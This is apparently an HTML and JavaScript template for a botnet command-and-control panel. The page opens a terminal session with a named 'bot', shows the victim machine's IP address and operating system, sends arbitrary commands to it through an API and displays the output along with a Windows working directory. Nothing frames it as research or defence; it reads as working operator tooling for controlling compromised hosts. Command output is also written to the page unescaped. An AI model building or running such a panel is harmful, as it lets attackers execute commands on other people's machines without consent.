<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SESSION: {{ bot_id }}</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .terminal-box { width: 95%; max-width: 1000px; height: 90vh; background: #000; border: 2px solid #0f0; padding: 15px; display: flex; flex-direction: column; }
        .header { border-bottom: 1px solid #0f0; padding-bottom: 10px; display: flex; justify-content: space-between; font-size: 14px; }
        .header a { color: #0f0; text-decoration: none; border: 1px solid #0f0; padding: 2px 12px; }
        .header a:hover { background: #0f0; color: #000; }
        #terminalOutput { flex: 1; background: #000; padding: 10px; overflow-y: auto; border: 1px solid #030; margin-bottom: 10px; white-space: pre-wrap; word-break: break-all; font-size: 15px; line-height: 1.5; }
        .input-area { display: flex; gap: 10px; }
        .input-area input { flex: 1; background: #000; border: 1px solid #0f0; padding: 12px; color: #0f0; font-family: monospace; font-size: 16px; outline: none; }
        .input-area input:focus { background: #010; }
        .input-area button { background: #000; border: 1px solid #0f0; color: #0f0; padding: 0 25px; font-family: monospace; font-size: 16px; cursor: pointer; }
        .input-area button:hover { background: #0f0; color: #000; }
        .prompt { color: #ff0; }
    </style>
</head>
<body>
<div class="terminal-box">
    <div class="header">
        <span>[SESSION] {{ bot_id }}</span>
        <span>{{ bot_info.ip }} | {{ bot_info.os }}</span>
        <a href="/dashboard">[EXIT]</a>
    </div>
    <div id="terminalOutput">
        <span class="prompt">></span> SESSION ESTABLISHED.<br>
        <span class="prompt">></span> AWAITING COMMANDS...
    </div>
    <div class="input-area">
        <input type="text" id="cmdInput" placeholder="enter command..." autofocus>
        <button onclick="sendCommand()">[RUN]</button>
    </div>
</div>
<script>
    const botId = "{{ bot_id }}";
    let currentCwd = "C:\\";
    function updatePrompt(newCwd) { if (newCwd) { currentCwd = newCwd; } }
    function appendToTerminal(text, isCommand = false) {
        const output = document.getElementById('terminalOutput');
        if (isCommand) {
            output.innerHTML += `<br><span style="color:#ff0;">${currentCwd}> </span>${text}`;
        } else {
            output.innerHTML += `<br>${text}`;
        }
        output.scrollTop = output.scrollHeight;
    }
    async function fetchResult() {
        try {
            const res = await fetch(`/api/get_result?id=${botId}`);
            const data = await res.json();
            if (data.output) { appendToTerminal(data.output); fetchCwd(); }
        } catch(e) {}
    }
    async function fetchCwd() {
        try {
            const res = await fetch('/api/active_bots');
            const bots = await res.json();
            const bot = bots.find(b => b.id === botId);
            if (bot && bot.cwd) updatePrompt(bot.cwd);
        } catch(e) {}
    }
    async function sendCommand() {
        const input = document.getElementById('cmdInput');
        const cmd = input.value.trim();
        if (!cmd) return;
        appendToTerminal(cmd, true);
        input.value = '';
        input.focus();
        await fetch('/api/send_command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: botId, cmd: cmd }) });
        setTimeout(fetchResult, 1500);
    }
    document.getElementById('cmdInput').addEventListener('keypress', function(e) { if (e.key === 'Enter') sendCommand(); });
    setInterval(fetchCwd, 3000);
    fetchCwd();
</script>
</body>
</html>
